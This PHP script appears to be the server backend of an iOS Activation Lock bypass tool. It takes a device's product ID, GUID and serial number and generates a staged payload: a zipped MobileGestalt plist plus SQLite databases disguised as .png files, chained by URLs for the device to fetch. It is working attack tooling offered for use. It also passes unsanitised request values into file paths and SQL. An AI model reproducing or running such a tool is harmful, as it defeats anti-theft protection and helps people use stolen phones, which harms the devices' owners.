<?php
/**
 * iOS Activation Bypass Backend
 * Professional Edition
 */

error_reporting(E_ALL);
ini_set('display_errors', 0); 
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../logs/error.log');

// Configuration
define('BASE_DIR', __DIR__ . '/..');
define('TEMPLATE_DIR', BASE_DIR . '/templates');
define('ASSETS_DIR', BASE_DIR . '/assets');
// Cache is now inside the current directory (public)
define('CACHE_DIR', __DIR__ . '/cache');

// Determine the base URL for download links
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
$host = $_SERVER['HTTP_HOST'];
$scriptPath = dirname($_SERVER['PHP_SELF']);
// Ensure no trailing slash issues
define('BASE_URL', $protocol . "://" . $host . $scriptPath);

if (!is_dir(CACHE_DIR)) mkdir(CACHE_DIR, 0755, true);

class PayloadGenerator {
    private $prd;
    private $guid;
    private $sn;

    public function __construct($prd, $guid, $sn) {
        $this->prd = str_replace(',', '-', $prd);
        $this->guid = $guid;
        $this->sn = $sn;
    }

    private function generateToken() { return bin2hex(random_bytes(8)); }

    private function readTemplate($filename) {
        if (!file_exists($filename)) throw new Exception("Template missing: " . basename($filename));
        return file_get_contents($filename);
    }

    private function createDatabaseFromSql($sqlContent, $outputPath) {
        try {
            // Fix Oracle/Custom unistr formatting for SQLite
            $sqlContent = preg_replace_callback("/unistr\s*\(\s*['\"]([^'\"]*)['\"]\\s*\)/i", function($matches) {
                $str = $matches[1];
                $str = preg_replace_callback('/\\\\([0-9A-Fa-f]{4})/', function($m) { 
                    return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE'); 
                }, $str);
                return "'" . str_replace("'", "''", $str) . "'";
            }, $sqlContent);
            
            $sqlContent = preg_replace("/unistr\s*\(\s*(['\"][^'\"]*['\"])\s*\)/i", "$1", $sqlContent);

            $db = new SQLite3($outputPath);
            $statements = explode(';', $sqlContent);
            foreach ($statements as $stmt) {
                $stmt = trim($stmt);
                if (!empty($stmt) && strlen($stmt) > 5) @$db->exec($stmt . ';');
            }
            $db->close();
            return true;
        } catch (Exception $e) {
            error_log("DB Creation Error: " . $e->getMessage());
            return false;
        }
    }

    public function process() {
        // 1. MobileGestalt
        $plistSource = ASSETS_DIR . "/Maker/{$this->prd}/com.apple.MobileGestalt.plist";
        if (!file_exists($plistSource)) {
            http_response_code(404);
            die("Error: Configuration not found for device {$this->prd}. Please ensure assets/Maker is populated.");
        }

        $token1 = $this->generateToken();
        $dir1 = CACHE_DIR . "/stage1/$token1";
        if (!is_dir($dir1)) mkdir($dir1, 0755, true);

        $zipPath = "$dir1/payload.zip";
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE) !== TRUE) die("Compression Error");
        $zip->addFile($plistSource, "Caches/com.apple.MobileGestalt.plist");
        $zip->close();
        rename($zipPath, "$dir1/fixedfile");
        
        // 2. BLDatabase
        $token2 = $this->generateToken();
        $dir2 = CACHE_DIR . "/stage2/$token2";
        if (!is_dir($dir2)) mkdir($dir2, 0755, true);

        $fixedfileUrl = BASE_URL . "/cache/stage1/$token1/fixedfile";
        $blSql = $this->readTemplate(TEMPLATE_DIR . '/bl_structure.sql');
        // CRITICAL: Replace BOTH ZTHUMBNAILIMAGEURL and ZURL with the payload URL
        // The template uses 'URL_GESTALT' as placeholder for both fields
        $blSql = str_replace('URL_GESTALT', $fixedfileUrl, $blSql);
        
        $this->createDatabaseFromSql($blSql, "$dir2/intermediate.sqlite");
        rename("$dir2/intermediate.sqlite", "$dir2/belliloveu.png");

        // Create dummy WAL/SHM files (required by downloads.28)
        file_put_contents("$dir2/belliloveu_wal.png", '');
        file_put_contents("$dir2/belliloveu_shm.png", '');
        
        // Create dummy iTunesMetadata.plist
        $metaPlist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict><key>FreeTool</key><string>Free for All</string></dict></plist>";
        file_put_contents("$dir2/metadata.plist", $metaPlist);

        // 3. Final Payload
        $token3 = $this->generateToken();
        $dir3 = CACHE_DIR . "/stage3/$token3";
        if (!is_dir($dir3)) mkdir($dir3, 0755, true);

        $blUrl = BASE_URL . "/cache/stage2/$token2/belliloveu.png";
        $walUrl = BASE_URL . "/cache/stage2/$token2/belliloveu_wal.png";
        $shmUrl = BASE_URL . "/cache/stage2/$token2/belliloveu_shm.png";
        $metaUrl = BASE_URL . "/cache/stage2/$token2/metadata.plist";
        
        $dlSql = $this->readTemplate(TEMPLATE_DIR . '/downloads_structure.sql');
        // Replace URL placeholders (template uses URL_DB, URL_WAL, URL_SHM, URL_METADATA)
        $dlSql = str_replace('URL_DB', $blUrl, $dlSql);
        $dlSql = str_replace('URL_WAL', $walUrl, $dlSql);
        $dlSql = str_replace('URL_SHM', $shmUrl, $dlSql);
        $dlSql = str_replace('URL_METADATA', $metaUrl, $dlSql);
        // Replace GUID placeholder (template uses hardcoded GUID that gets replaced)
        $dlSql = str_replace('3DBBBC39-F5BA-4333-B40C-6996DE48F91C', $this->guid, $dlSql);

        $this->createDatabaseFromSql($dlSql, "$dir3/final.sqlite");
        rename("$dir3/final.sqlite", "$dir3/payload.png");

        return BASE_URL . "/cache/stage3/$token3/payload.png";
    }
}

if (!isset($_GET['prd'], $_GET['guid'], $_GET['sn'])) {
    http_response_code(400);
    die("Invalid Parameters");
}

try {
    $gen = new PayloadGenerator($_GET['prd'], $_GET['guid'], $_GET['sn']);
    echo $gen->process();
} catch (Exception $e) {
    http_response_code(500);
    die("Server Error");
}
